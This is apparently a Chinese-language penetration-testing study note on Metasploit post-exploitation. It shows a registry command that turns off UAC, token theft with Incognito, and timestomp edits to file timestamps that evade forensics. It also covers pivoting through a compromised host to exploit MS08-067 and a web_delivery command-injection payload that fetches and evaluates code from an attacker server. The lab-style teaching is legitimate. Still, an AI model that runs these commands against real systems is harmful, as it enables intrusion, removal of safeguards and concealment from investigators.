绕过UAC

绕过UAC不代表关闭UAC

UAC的定义：

用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。

UAC的运作：

一旦程序执行设计系统更改/特定任务就会触发UAC，除非尝试执行他们的进程以管理员权限运行，否则这些操作都将被阻止。而没有管理员权限将无法执行以下操作：

①注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下【因为它影响多个用户】，它将是只读的）

②加载设备驱动程序

③DLL注入

④修改系统时间（clock）

⑤修改用户账户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操作）

⑥修改受保护的目录（如Windows文件夹，pragram files）

⑦计划任务（例如，以管理员权限自启动）

关闭客户端UAC

在客户端shell中执行以下命令，修改注册表关闭UAC

原理就是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，已达到帮助阻止恶意程序损坏系统的效果。

cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
ADD 添加一个注册表项
-v 创建键值
-t 键值类型
-d 键值的值
-f 强制修改注册表项

Tokens

  • Tokens
    • 用户每次登录，账号绑定临时的Token
    • 访问资源时提交Token进行身份验证，类似于WEB Cookie
    • Delegate(委派) Token：交互登录会话；例如本地登录/RDP登录
    • Impersonate Token：非交互登录会话；例如访问文件共享
    • Delegate Token账号注销后变为Impersonate Token，权限依然有效
  • Incognito
    • 独立功能的软件，被MSF集成在meterpreter中，用于Token窃取
    • 无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户
    • 尤其适用于域环境下提权渗透多操作系统

注册表修改

  • 注册表保存着windows几乎全部配置参数

    • 修改前完整备份注册表

文件系统

  • 文件系统访问会留下痕迹，电子取证重点关注

  • 渗透测试和攻击者往往希望销毁文件系统访问痕迹

  • 最好的避免被电子取证发现的发放：不要碰文件系统

    • Meterpreter 的先天优势所在（完全基于内存）

  • MAC 时间（Modified / Accessed / Changed）

    • 修改文件内容会产生Modified时间，系统会记录Modified时间

    • 只对文件访问会产生Accessed时间，系统会记录Accessed时间

    • 修改文件属性会产生Changed时间，系统会记录Changed时间

      （文件属性表示权限等文件内在信息）

Msf 修改 MAC 时间

查看 MAC

MACE：E表示MFT entry

MFT：NTFS 文件系统的主文件分配表 Master File Table

通常1024字节或2个硬盘扇区，其中存放多项 entry 信息（entry表示很多项）

Entry包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期），这些信息只要被修改就会修改E(Entry)时间

更多信息可研究文件系统取证分析技术

基于模板修改 MAC

timestomp -f c:\\autorun.inf 1.txt

-f：修改为模板时间，此模板是什么时间，1.txt就会被修改为什么时间

指定时间修改 MAC

timestomp -z "MM/DD/YYYY HH24:MI:SS" 2.txt
-m / -a / -c / -e / -z 可单个修改，也可使用-z全部修改

Pivoting

利用已经控制的一台计算机作为入侵内网的 跳板

在其他内网计算机看来访问全部来自于 跳板机

场景描述

假设攻击者已经控制了win7主机，并且防火墙只允许win7主机访问外网，就可以利用win7主机攻击XP，XP返回的信息也会通过win7这个支点返回给攻击者

由于设备资源有限，无法搭建太多主机，只有攻击者，跳板机和受害机。

自动路由

此时已经取得win7主机的session，基于攻击者与win7之间的session，在攻击端添加一条路由，这条路由只适用于msf内部使用，凡是到目标内部网段的通信请求都添加路由，也就是说都经过取得的session进行路由通信。

run autoroute -s 192.168.216.0/24
use post/multi/manage/autoroute
-s：指目标网段的IP
凡是发送到192.168.216.0/24此网段的通信请求都会通过win7转发到内网其他主机

扫描内网

此时已经建立起了自动路由功能，凡是发送到192.168.216.0/24此网段的通信请求都会通过win7转发到内网其他主机，在这样情况下直接扫描内网

use auxiliary/scanner/portscan/tcp

漏洞利用

扫描完成之后发现455端口开放，可能存在ms08-067，就可以通过跳板机利用漏洞，由于防火墙不允许内网主机出网，因此攻击者就算利用了漏洞，受害机因为无法反弹shell，基于这样的情况在配置LHOST时提前设置，可以放在攻击者边界防火墙的出口端口上，若还是接收不到shell就可以将LHOST直接设置为跳板机的ip，跳板机与受害机处于同网段，就可以接收受害机反弹的shell，进而通过路由再反弹给攻击者。

Web Delivery

利用代码执行漏洞访问攻击者服务器

在攻击端启动一个web server，放一个漏洞执行的代码(exploit)，找一个存在系统命令运行漏洞的目标服务器，让目标服务器访问攻击端web的exploit代码，只要访问web页面exploit代码就会自动下载到目标服务器执行，就会生成meterpreter shell回弹给攻击端。

启动模块

use exploit/multi/script/web_delivery

本地侦听8080端口，等待目标主机远程访问8080端口的服务，此时就会将meterpreter shell传给目标主机，目标主机拿到meterpreter shell后会在本地执行拿到的meterpreter shell，最后将目标主机本地的shell反弹给攻击端。

命令执行

127.0.0.1;php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.216.171:8080/LrMLRcV'));"

由msf生成的php命令执行无法拿到shell，利用官网提供的cmd命令可以拿到shell

官网地址：https://www.offensive-security.com/metasploit-unleashed/web-delivery/
